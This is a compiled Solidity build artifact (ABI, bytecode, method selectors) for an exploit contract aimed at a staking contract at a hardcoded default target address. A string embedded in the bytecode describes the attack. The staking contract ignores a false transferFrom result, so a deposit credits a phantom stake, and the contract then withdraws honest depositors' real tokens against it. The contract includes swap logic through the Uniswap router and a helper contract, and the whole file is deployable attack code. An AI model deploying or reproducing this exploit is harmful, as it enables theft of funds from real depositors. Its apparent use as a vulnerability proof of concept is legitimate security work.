{"abi":[{"type":"constructor","inputs":[],"stateMutability":"nonpayable"},{"type":"receive","stateMutability":"payable"},{"type":"function","name":"ATTACK_AMOUNT","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"BAT","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"DAI","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"DEFAULT_TARGET","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"EXPLOIT_PATH","inputs":[],"outputs":[{"name":"","type":"string","internalType":"string"}],"stateMutability":"view"},{"type":"function","name":"FUN","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"MIN_DETECTABLE_PROFIT","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"SWAP_BUDGET","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"UNISWAP_V2_ROUTER","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"USDC","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"USDT","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"WETH","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"ZRX","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"attackerBalanceAfterDeposit","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"attackerBalanceAfterWithdraw","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"attackerBalanceBeforeDeposit","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"configure","inputs":[{"name":"target_","type":"address","internalType":"address"},{"name":"exploitToken_","type":"address","internalType":"address"},{"name":"attackAmount_","type":"uint256","internalType":"uint256"}],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"configuredAttackAmount","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"execute","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"nonpayable"},{"type":"function","name":"executeOnOpportunity","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"nonpayable"},{"type":"function","name":"executed","inputs":[],"outputs":[{"name":"","type":"bool","internalType":"bool"}],"stateMutability":"view"},{"type":"function","name":"existingLiquidityBeforeExploit","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"exploit","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"nonpayable"},{"type":"function","name":"exploitPath","inputs":[],"outputs":[{"name":"","type":"string","internalType":"string"}],"stateMutability":"pure"},{"type":"function","name":"exploitToken","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"failureReason","inputs":[],"outputs":[{"name":"","type":"string","internalType":"string"}],"stateMutability":"view"},{"type":"function","name":"honestDepositAmount","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"honestDepositor","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"hypothesisValidated","inputs":[],"outputs":[{"name":"","type":"bool","internalType":"bool"}],"stateMutability":"view"},{"type":"function","name":"phantomDepositAmount","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"preparedUntilEpoch","inputs":[],"outputs":[{"name":"","type":"uint128","internalType":"uint128"}],"stateMutability":"view"},{"type":"function","name":"profitAchieved","inputs":[],"outputs":[{"name":"","type":"bool","internalType":"bool"}],"stateMutability":"view"},{"type":"function","name":"profitAmount","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"profitToken","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"recordedStakeAfterDeposit","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"recordedStakeAfterWithdraw","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"recordedStakeBeforeDeposit","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"run","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"nonpayable"},{"type":"function","name":"target","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"targetBalanceAfterDeposit","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"targetBalanceAfterHonestDeposit","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"targetBalanceAfterWithdraw","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"targetBalanceBeforeDeposit","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"}],"bytecode":{"object":"0x60808060405234605c575f80546001600160a01b031990811673245a551ee0f55005e510b239c917fa34b41b34611790915560018054909116730d8775f648430679a709e98d2b0cb6250d2887ef179055612c9190816100618239f35b5f80fdfe608080604052600436101561001c575b50361561001a575f80fd5b005b5f3560e01c90816304561a1c1461083c575080631a202ba01461081f57806321b202f4146107f95780632a8a53f1146107d15780632caa3fa9146107b45780632e1fc5cc1461044e57806331a38c891461078f57806333f754e9146107725780633c2448ed1461038b578063463defd11461074d57806349343624146107255780634b41ebff146107085780634f9522a41461065157806359bb1bcc146106345780635b7ab891146106065780635ff972cc146105e9578063614619541461038b57806363d9b7701461038b57806365ee574f146105cc57806378b96ccf1461059e57806378e6811d146104d857806379720cdf146104bb578063876853411461049e578063894b91fe1461048157806389a302711461045357806389ea43e41461044e5780639b74106614610426578063a6cdedae14610409578063a82ed9ec146103db578063ad5c4648146103ad578063bc55ad4614610390578063c04062261461038b578063c54e44eb1461035d578063cb707c62146102e7578063cdecd1d71461032f578063d0ec189e14610312578063d22b8da2146102e7578063d40fa8bf146102b9578063d4b8399214610292578063d690e52714610275578063e0bab4c414610247578063ee88863c1461022a5763f0a0117614610201575f61000f565b34610226575f36600319011261022657602060ff60025460a81c166040519015158152f35b5f80fd5b34610226575f366003190112610226576020601254604051908152f35b34610226575f366003190112610226576020604051736b175474e89094c44da98b954eedeac495271d0f8152f35b34610226575f366003190112610226576020600654604051908152f35b34610226575f366003190112610226575f546040516001600160a01b039091168152602090f35b34610226575f36600319011261022657602060405173e41d2489571d322189246dafa5ebde1f4699f4988152f35b34610226575f3660031901126102265761030e610302610937565b6040519182918261090d565b0390f35b34610226575f366003190112610226576020601054604051908152f35b34610226575f36600319011261022657602060405173419d0d8bdd9af5e606ae2232ed285aff190e711b8152f35b34610226575f36600319011261022657602060405173dac17f958d2ee523a2206206994597c13d831ec78152f35b61087e565b34610226575f366003190112610226576020600c54604051908152f35b34610226575f36600319011261022657602060405173c02aaa39b223fe8d0a0e5c4f27ead9083c756cc28152f35b34610226575f366003190112610226576020604051737a250d5630b4cf539739df2c5dacb4c659f2488d8152f35b34610226575f366003190112610226576020600554604051908152f35b34610226575f366003190112610226576002546040516001600160a01b039091168152602090f35b61085c565b34610226575f36600319011261022657602060405173a0b86991c6218b36c1d19d4a2e9eb0ce3606eb488152f35b34610226575f366003190112610226576020600b54604051908152f35b34610226575f366003190112610226576020600f54604051908152f35b34610226575f366003190112610226576020600754604051908152f35b34610226576060366003190112610226576004356001600160a01b03811690819003610226576024356001600160a01b03811691908290036102265760ff60025460a01c16610566578061054f575b5080610536575b604435600855005b6001600160601b0360a01b60015416176001558061052e565b6001600160601b0360a01b5f5416175f5581610527565b60405162461bcd60e51b815260206004820152601060248201526f185b1c9958591e48195e1958dd5d195960821b6044820152606490fd5b34610226575f36600319011261022657602060405173245a551ee0f55005e510b239c917fa34b41b34618152f35b34610226575f366003190112610226576020600e54604051908152f35b34610226575f366003190112610226576020601454604051908152f35b34610226575f366003190112610226576020604051730d8775f648430679a709e98d2b0cb6250d2887ef8152f35b34610226575f366003190112610226576020600d54604051908152f35b34610226575f366003190112610226576040515f600354610671816108a0565b80845290600181169081156106e45750600114610699575b61030e83610302818503826108d8565b91905060035f525f516020612c1c5f395f51905f52915f905b8082106106ca57509091508101602001610302610689565b9192600181602092548385880101520191019092916106b2565b60ff191660208086019190915291151560051b840190910191506103029050610689565b34610226575f366003190112610226576020600a54604051908152f35b34610226575f366003190112610226576013546040516001600160a01b039091168152602090f35b34610226575f36600319011261022657602060ff60025460b01c166040519015158152f35b34610226575f366003190112610226576020601154604051908152f35b34610226575f36600319011261022657602060ff60025460a01c166040519015158152f35b34610226575f366003190112610226576020600854604051908152f35b34610226575f366003190112610226576001546040516001600160a01b039091168152602090f35b34610226575f3660031901126102265760206001600160801b0360045416604051908152f35b34610226575f366003190112610226576020600954604051908152f35b34610226575f366003190112610226578067016345785d8a000060209252f35b34610226575f366003190112610226576020604051670de0b6b3a76400008152f35b34610226575f366003190112610226576020610898610ca0565b604051908152f35b90600182811c921680156108ce575b60208310146108ba57565b634e487b7160e01b5f52602260045260245ffd5b91607f16916108af565b90601f801991011681019081106001600160401b038211176108f957604052565b634e487b7160e01b5f52604160045260245ffd5b602060409281835280519182918282860152018484015e5f828201840152601f01601f1916010190565b604051906109476101c0836108d8565b61018482526374616b6560e01b6101a0837f7573652061207072652d6578697374696e67206f6e2d636861696e206e6f6e2d60208201527f737461626c6520746f6b656e2077686f7365204552433230207472616e73666560408201527f7246726f6d2072657475726e732066616c7365206f6e20696e7375666669636960608201527f656e742061747461636b65722062616c616e6365202d3e206465706f7369742060808201527f7265636f726473207068616e746f6d207374616b65207768696c65207468652060a08201527f7374616b696e6720636f6e7472616374207265636569766573206e6f7468696e60c08201527f67202d3e20736f75726365207468652073616d6520616c72656164792d65786960e08201527f7374696e6720746f6b656e207468726f7567682061207075626c6963206f6e2d6101008201527f636861696e207377617020616e64206d616b6520616e20686f6e6573742064656101208201527f706f7369742066726f6d20612073657061726174652068656c706572206164646101408201527f72657373202d3e207769746864726177207265616c20746f6b656e732066726f6101608201527f6d207374616b696e6720616761696e73742074686520756e66756e64656420736101808201520152565b818110610b34575050565b5f8155600101610b29565b601f8111610b4a5750565b60035f52610b6f90601f0160051c5f516020612c1c5f395f51905f5290810190610b29565b565b601f8111610b7c5750565b60035f52610b6f90601f0160051c5f516020612c1c5f395f51905f52015f516020612bfc5f395f51905f52610b29565b90601f8211610bb9575050565b610b6f9160035f5260205f20906020601f840160051c83019310610be5575b601f0160051c0190610b29565b9091508190610bd8565b5f9060033d11610bfb57565b905060045f803e5f5160e01c90565b5f60443d10610c6e576040513d600319016004823e8051913d60248401116001600160401b03841117610c7957828201928351916001600160401b038311610c71573d84016003190185840160200111610c715750610c6e929101602001906108d8565b90565b949350505050565b92915050565b91908201809211610c8c57565b634e487b7160e01b5f52601160045260245ffd5b5f60025460ff8160a01c16611cca5760ff60a01b1916600160a01b176002555f546001906001600160a01b03163b15611c5c5780546001600160a01b03168015908115611c52575b50611c1a5760018060a01b0381541673a0b86991c6218b36c1d19d4a2e9eb0ce3606eb488114908115611bfc575b8115611bde575b50611b915760018060a01b03815416730d8775f648430679a709e98d2b0cb6250d2887ef8114908115611b73575b8115611b55575b5015611ae7578054610d6c906001600160a01b0316611d57565b15611ae1576040516103af808201908282106001600160401b038311176108f957602091839161284d83393081520301905ff08015611ad657600280546001600160a01b0319166001600160a01b0392831690811790915582549091610dd49183911661225a565b15611a3757600254610dee906001600160a01b03166125ac565b1561197f578154600254610e1b91610e12916001600160a01b0390811691166126d1565b8060065561274a565b80600755156118cf5781545f546001600160a01b0391821691610e5c91610e439116836126d1565b9182600555610e52813061278d565b60105530906126d1565b9081600955600c556118815760018060a01b0382541660018060a01b035f54169060075490610eb560405163095ea7b360e01b60208201528460248201525f604482015260448152610eaf6064826108d8565b82612807565b9283611830575b505050156117c1575f5482546007546001600160a01b039283169290911690823b156102265760645f92836040519586948593633d14d1b760e21b8552600485015260248401528160448401525af190816117ac575b506110855750610f20610bef565b6308c379a014610f96575b610f366003546108a0565b90601f8211610f69575b50507f6465706f7369742072657665727465640000000000000000000000000000002060035590565b5060038252610f8f90601f0160051c5f516020612c1c5f395f51905f5290810190610b29565b5f80610f40565b610f9e610c0a565b80610fa95750610f2b565b8051906001600160401b03821161107157610fce82610fc96003546108a0565b610bac565b602090601f8311600114611008579282939183928694610ffd575b50501b915f199060031b1c19161760035590565b015192505f80610fe9565b600385525f516020612c1c5f395f51905f52919083601f198116875b8782821061105857505010611040575b505050811b0160035590565b01515f1960f88460031b161c191690555f8080611034565b8486015187559095019460209485019487935001611024565b634e487b7160e01b84526041600452602484fd5b815461109b9030906001600160a01b03166126d1565b600a819055825484546110ba916001600160a01b0391821691166126d1565b600d5582546110d2906001600160a01b03163061278d565b6011556009540361175b57600d54600c54036116b7576011546110fa60105460075490610c7f565b036116805782548254600754926001600160a01b039182169290911690803b1561167c579160648693928480946040519788958694637500856b60e01b86526004860152602485015260448401525af19182611667575b50506112865761115f610bef565b6308c379a0146111d5575b6111756003546108a0565b90601f82116111a8575b50507f686f6e657374206465706f73697420726576657274656400000000000000002e60035590565b50600382526111ce90601f0160051c5f516020612c1c5f395f51905f5290810190610b29565b5f8061117f565b6111dd610c0a565b806111e8575061116a565b8051906001600160401b0382116110715761120882610fc96003546108a0565b602090601f8311600114611236579282939183928694610ffd5750501b915f199060031b1c19161760035590565b600385525f516020612c1c5f395f51905f52919083601f198116875b8782821061126d5750501061104057505050811b0160035590565b8486015187559095019460209485019487935001611252565b6007546006819055815483546112b9916112ac916001600160a01b0390811691166126d1565b9182600e55600d54610c7f565b116116315781548154600754916001600160a01b039081169116813b1561162d5760405163f3fef3a360e01b81526001600160a01b039190911660048201526024810192909252839081908390604490829084905af19182611614575b505061160f5780611325610bef565b6308c379a01461155d575b6114f2575b805461134b9030906001600160a01b03166126d1565b600b5580548254611368916001600160a01b0391821691166126d1565b600f55805461139190611384906001600160a01b03163061278d565b8060125560075490610c7f565b6011540361145257600b5460095410156114175760018060a01b039054166001600160601b0360a01b6013541617601355600b546009549081810392818411611403575060148390556002805461ffff60a81b1916929091141560a81b60ff60a81b1691909117600160b01b17905590565b634e487b7160e01b81526011600452602490fd5b5061142b6114266003546108a0565b610b3f565b7f77697468647261772070726f6475636564206e6f2070726f666974000000003660035590565b5061145e6003546108a0565b601f81116114bc575b50604b600355600381527f7068616e746f6d207374616b65206e6f742064656269746564206f6e207769745f516020612c1c5f395f51905f525564686472617760d81b5f516020612bfc5f395f51905f525590565b600382526114ec90601f0160051c5f516020612c1c5f395f51905f52015f516020612c3c5f395f51905f52610b29565b5f611467565b6114fd6003546108a0565b90601f8211611530575b50507f776974686472617720726576657274656400000000000000000000000000002260035590565b506003825261155690601f0160051c5f516020612c1c5f395f51905f5290810190610b29565b5f80611507565b611565610c0a565b806115705750611330565b805191506001600160401b0382116110715761159182610fc96003546108a0565b602090601f83116001146115bf579282939183928694610ffd5750501b915f199060031b1c19161760035590565b600385525f516020612c1c5f395f51905f52919083601f198116875b878282106115f65750501061104057505050811b0160035590565b84860151875590950194602094850194879350016115db565b611335565b8161161e916108d8565b61162957825f611316565b8280fd5b8480fd5b506116406114266003546108a0565b7f686f6e657374206c6971756964697479206e6f742066756e646564000000003660035590565b81611671916108d8565b61162957825f611151565b8580fd5b50506116906114266003546108a0565b7f7068616e746f6d207374616b6520637265646974206d697373696e670000003860035590565b50506116c46003546108a0565b601f8111611725575b506051600355600381527f6465706f736974207472616e73666572726564207265616c2061747461636b655f516020612c1c5f395f51905f5255677220746f6b656e7360c01b5f516020612bfc5f395f51905f525590565b6003825261175590601f0160051c5f516020612c1c5f395f51905f52015f516020612c3c5f395f51905f52610b29565b5f6116cd565b505061177061176b6003546108a0565b610b71565b6041600355600381527f6465706f73697420636f6e73756d65642061747461636b657220746f6b656e735f516020612c1c5f395f51905f525590565b6117b99194505f906108d8565b5f925f610f12565b5090506117cf6003546108a0565b90601f8211611803575b50507f617070726f7665206661696c656400000000000000000000000000000000001c6003555f90565b5060035f5261182990601f0160051c5f516020612c1c5f395f51905f5290810190610b29565b5f806117d9565b60405163095ea7b360e01b60208201526001600160a01b0390911660248201526044810192909252611879925061187482606481015b03601f1981018452836108d8565b612807565b5f8080610ebc565b50505061189261176b6003546108a0565b604160035560035f527f61747461636b6572207374696c6c2068617320746f6b656e2062616c616e63655f516020612c1c5f395f51905f52555f90565b5050506118dd6003546108a0565b601f8111611949575b50606560035560035f527f696e73756666696369656e7420686f6e657374206c697175696469747920666f5f516020612c1c5f395f51905f5255713910383937b334ba30b1363290323930b4b760711b5f516020612bfc5f395f51905f52555f90565b60035f5261197990601f0160051c5f516020612c1c5f395f51905f52015f516020612c3c5f395f51905f52610b29565b5f6118e6565b50505060035461198e816108a0565b1561199857505f90565b6119a1906108a0565b601f8111611a01575b50604d60035560035f527f6661696c656420746f20636c6561722061747461636b657220746f6b656e20625f516020612c1c5f395f51905f525565616c616e636560d01b5f516020612bfc5f395f51905f52555f90565b60035f52611a3190601f0160051c5f516020612c1c5f395f51905f52015f516020612c3c5f395f51905f52610b29565b5f6119aa565b505050611a456003546108a0565b601f8111611aa0575b50604360035560035f527f6661696c656420746f20736f7572636520686f6e657374206c697175696469745f516020612c1c5f395f51905f5255607960f81b5f516020612bfc5f395f51905f52555f90565b60035f52611ad090601f0160051c5f516020612c1c5f395f51905f52015f516020612c3c5f395f51905f52610b29565b5f611a4e565b6040513d5f823e3d90fd5b50505f90565b9050611af46003546108a0565b90601f8211611b28575b50507f756e737570706f72746564206578706c6f697420746f6b656e000000000000326003555f90565b5060035f52611b4e90601f0160051c5f516020612c1c5f395f51905f5290810190610b29565b5f80611afe565b73419d0d8bdd9af5e606ae2232ed285aff190e711b9150145f610d52565b73e41d2489571d322189246dafa5ebde1f4699f49881149150610d4b565b5050611ba161176b6003546108a0565b604160035560035f527f6578706c6f697420746f6b656e206d757374206265206e6f6e2d737461626c655f516020612c1c5f395f51905f52555f90565b736b175474e89094c44da98b954eedeac495271d0f9150145f610d1d565b73dac17f958d2ee523a2206206994597c13d831ec781149150610d16565b5050611c2a6114266003546108a0565b7f6578706c6f697420746f6b656e206e6f7420636f6e66696775726564000000386003555f90565b90503b155f610ce8565b9050611c696003546108a0565b90601f8211611c9d575b50507f746172676574206e6f74206465706c6f796564000000000000000000000000266003555f90565b5060035f52611cc390601f0160051c5f516020612c1c5f395f51905f5290810190610b29565b5f80611c73565b505060145490565b805115611cdf5760200190565b634e487b7160e01b5f52603260045260245ffd5b805160011015611cdf5760400190565b90816020910312610226575180151581036102265790565b90602080835192838152019201905f5b818110611d385750505090565b82516001600160a01b0316845260209384019390920191600101611d2b565b5f54604051635cbeecf160e11b815290602090829060049082906001600160a01b03165afa5f9181612216575b50611eae575050611d93610bef565b6308c379a014611dd4575b611dac6114266003546108a0565b7f6661696c656420746f20726561642063757272656e742065706f6368000000386003555f90565b611ddc610c0a565b80611de75750611d9e565b9081516001600160401b0381116108f957611e0781610fc96003546108a0565b602092601f8211600114611e4357928192935f92611e38575b50508160011b915f199060031b1c1916176003555f90565b015190505f80611e20565b601f1982169360035f525f516020612c1c5f395f51905f52915f5b868110611e965750836001959610611e7e575b505050811b016003555f90565b01515f1960f88460031b161c191690555f8080611e71565b91926020600181928685015181550194019201611e5e565b6040805190611ebd81836108d8565b60018252601f198101366020840137611ed582611cd2565b6001600160a01b03909416938490525f5b6001600160801b038116906001600160801b038516821161220b575f548351632a95e45560e21b8152600481018890526024810184905290602090829060449082906001600160a01b03165afa5f91816121db575b506120455750505050505050611f4f610bef565b6308c379a014611f90575b611f686114266003546108a0565b7f6661696c656420746f20726561642065706f63682073746174650000000000346003555f90565b611f98610c0a565b80611fa35750611f5a565b9081516001600160401b0381116108f957611fc381610fc96003546108a0565b602092601f8211600114611ff357928192935f92611e385750508160011b915f199060031b1c1916176003555f90565b601f1982169360035f525f516020612c1c5f395f51905f52915f5b86811061202d5750836001959610611e7e57505050811b016003555f90565b9192602060018192868501518155019401920161200e565b15612075575b6001600160801b039182196004541617600455166001600160801b038114610c8c57600101611ee6565b5f546001600160a01b0316803b15610226575f845180926375161c5760e11b82528660048301528183816120ac604482018c611d1b565b89602483015203925af190816121cb575b506121c6575050505050506120d0610bef565b6308c379a014612111575b6120e96114266003546108a0565b7f6d616e75616c2065706f636820696e69742072657665727465640000000000346003555f90565b612119610c0a565b8061212457506120db565b9081516001600160401b0381116108f95761214481610fc96003546108a0565b602092601f821160011461217457928192935f92611e385750508160011b915f199060031b1c1916176003555f90565b601f1982169360035f525f516020612c1c5f395f51905f52915f5b8681106121ae5750836001959610611e7e57505050811b016003555f90565b9192602060018192868501518155019401920161218f565b61204b565b5f6121d5916108d8565b5f6120bd565b6121fd91925060203d8111612204575b6121f581836108d8565b810190611d03565b905f611f3b565b503d6121eb565b505050505050600190565b9091506020813d602011612252575b81612232602093836108d8565b8101031261022657516001600160801b038116810361022657905f611d84565b3d9150612225565b670de0b6b3a7640000471061250b576122e85f916040519061227d6060836108d8565b60028252604036602084013773c02aaa39b223fe8d0a0e5c4f27ead9083c756cc26122a783611cd2565b526122b182611cf3565b6001600160a01b039091169052604051637ff36ab560e01b8152600481018490526080602482015293849283926084840190611d1b565b6001600160a01b0390911660448301524260648301520381670de0b6b3a7640000737a250d5630b4cf539739df2c5dacb4c659f2488d5af15f918161246e575b5061244f5750612336610bef565b6308c379a01461239a575b61234c6003546108a0565b601f811161236f575b5060166a1cddd85c0819985a5b195960aa1b016003555f90565b60035f5261239490601f0160051c5f516020612c1c5f395f51905f5290810190610b29565b5f612355565b6123a2610c0a565b806123ad5750612341565b9081516001600160401b0381116108f9576123cd81610fc96003546108a0565b602092601f82116001146123fd57928192935f92611e385750508160011b915f199060031b1c1916176003555f90565b601f1982169360035f525f516020612c1c5f395f51905f52915f5b8681106124375750836001959610611e7e57505050811b016003555f90565b91926020600181928685015181550194019201612418565b6001815111908161245e575090565b6124689150611cf3565b51151590565b9091503d805f833e61248081836108d8565b810190602081830312610226578051906001600160401b03821161022657019080601f83011215610226578151916001600160401b0383116108f9578260051b9060208201936124d360405195866108d8565b845260208085019282010192831161022657602001905b8282106124fb57505050905f612328565b81518152602091820191016124ea565b50506125186003546108a0565b601f8111612576575b50604960035560035f527f696e73756666696369656e74206e61746976652062616c616e636520666f72205f516020612c1c5f395f51905f5255630737761760e41b5f516020612bfc5f395f51905f52555f90565b60035f526125a690601f0160051c5f516020612c1c5f395f51905f52015f516020612c3c5f395f51905f52610b29565b5f612521565b6001546001600160a01b03166125c230826126d1565b90811561268b5760405163a9059cbb60e01b60208201526001600160a01b039093166024840152604483019190915261260391906118748260648101611866565b156126235760015461261f9030906001600160a01b03166126d1565b1590565b61262e6003546108a0565b601f8111612660575b507f64757374207472616e73666572206661696c65640000000000000000000000286003555f90565b60035f5261268590601f0160051c5f516020612c1c5f395f51905f5290810190610b29565b5f612637565b505050600190565b3d156126cc573d906001600160401b0382116108f957604051916126c1601f8201601f1916602001846108d8565b82523d5f602084013e565b606090565b6040516370a0823160e01b602082019081526001600160a01b0390931660248083019190915281525f928392916127096044826108d8565b51915afa612715612693565b9015801561273f575b61273a5760208151918180820193849201010312610226575190565b505f90565b50602081511061271e565b67016345785d8a0000811061273a57600854806127875750805b80821161277f575b5067016345785d8a0000811061273a5790565b90505f61276c565b90612764565b5f54604051633de222bb60e21b81526001600160a01b039283166004820152928216602484015260209183916044918391165afa5f91816127d3575b50610c6e57505f90565b9091506020813d6020116127ff575b816127ef602093836108d8565b810103126102265751905f6127c9565b3d91506127e2565b5f91829182602083519301915af161281d612693565b901561273a5780519081156128455760208210611ae157602080610c6e938301019101611d03565b505060019056fe60a034606b57601f6103af38819003918201601f19168301916001600160401b03831184841017606f57808492602094604052833981010312606b57516001600160a01b0381168103606b5760805260405161032b908161008482396080518181816049015260c00152f35b5f80fd5b634e487b7160e01b5f52604160045260245ffdfe6080806040526004361015610012575f80fd5b5f905f3560e01c9081637500856b1461007b5750638da5cb5b14610034575f80fd5b346100785780600319360112610078576040517f00000000000000000000000000000000000000000000000000000000000000006001600160a01b03168152602090f35b80fd5b9050346101b45760603660031901126101b4576004356001600160a01b03811691908290036101b4576024356001600160a01b03811691908290036101b457604435907f00000000000000000000000000000000000000000000000000000000000000006001600160a01b03163303610278575060405163095ea7b360e01b81528360048201525f60248201526020816044815f875af19081156101a9575f91610259575b501561021d5760405163095ea7b360e01b81528360048201528160248201526020816044815f875af19081156101a9575f916101ee575b50156101b857823b156101b45760645f92836040519586948593633d14d1b760e21b8552600485015260248401528160448401525af180156101a95761019b575080f35b6101a791505f906102a7565b005b6040513d5f823e3d90fd5b5f80fd5b60405162461bcd60e51b815260206004820152600e60248201526d185c1c1c9bdd994819985a5b195960921b6044820152606490fd5b610210915060203d602011610216575b61020881836102a7565b8101906102dd565b5f610157565b503d6101fe565b60405162461bcd60e51b8152602060048201526014602482015273185c1c1c9bdd99481c995cd95d0819985a5b195960621b6044820152606490fd5b610272915060203d6020116102165761020881836102a7565b5f610120565b62461bcd60e51b815260206004820152600a60248201526937b7363c9037bbb732b960b11b6044820152606490fd5b90601f8019910116810190811067ffffffffffffffff8211176102c957604052565b634e487b7160e01b5f52604160045260245ffd5b908160209103126101b4575180151581036101b4579056fea2646970667358221220d45dc6a164ebbf399fd5b9db549d92d4efcb0535ea0bfe98b4e10148c4e6d79c64736f6c634300081e0033c2575a0e9e593c00f959f8c92f12db2869c3395a3b0502d05e2516446f71f85cc2575a0e9e593c00f959f8c92f12db2869c3395a3b0502d05e2516446f71f85bc2575a0e9e593c00f959f8c92f12db2869c3395a3b0502d05e2516446f71f85da2646970667358221220f7b7ec81cbfc066b6d78d655303217567ffbb2667ba31a56f119a5dc83dd862264736f6c634300081e0033","linkReferences":{}},"methodIdentifiers":{"ATTACK_AMOUNT()":"89ea43e4","BAT()":"5b7ab891","DAI()":"e0bab4c4","DEFAULT_TARGET()":"78b96ccf","EXPLOIT_PATH()":"d22b8da2","FUN()":"cdecd1d7","MIN_DETECTABLE_PROFIT()":"04561a1c","SWAP_BUDGET()":"2e1fc5cc","UNISWAP_V2_ROUTER()":"a82ed9ec","USDC()":"89a30271","USDT()":"c54e44eb","WETH()":"ad5c4648","ZRX()":"d40fa8bf","attackerBalanceAfterDeposit()":"4b41ebff","attackerBalanceAfterWithdraw()":"894b91fe","attackerBalanceBeforeDeposit()":"1a202ba0","configure(address,address,uint256)":"78e6811d","configuredAttackAmount()":"2caa3fa9","execute()":"61461954","executeOnOpportunity()":"3c2448ed","executed()":"31a38c89","existingLiquidityBeforeExploit()":"a6cdedae","exploit()":"63d9b770","exploitPath()":"cb707c62","exploitToken()":"2a8a53f1","failureReason()":"4f9522a4","honestDepositAmount()":"d690e527","honestDepositor()":"9b741066","hypothesisValidated()":"463defd1","phantomDepositAmount()":"79720cdf","preparedUntilEpoch()":"21b202f4","profitAchieved()":"f0a01176","profitAmount()":"5ff972cc","profitToken()":"49343624","recordedStakeAfterDeposit()":"33f754e9","recordedStakeAfterWithdraw()":"ee88863c","recordedStakeBeforeDeposit()":"d0ec189e","run()":"c0406226","target()":"d4b83992","targetBalanceAfterDeposit()":"59bb1bcc","targetBalanceAfterHonestDeposit()":"65ee574f","targetBalanceAfterWithdraw()":"87685341","targetBalanceBeforeDeposit()":"bc55ad46"},"id":0}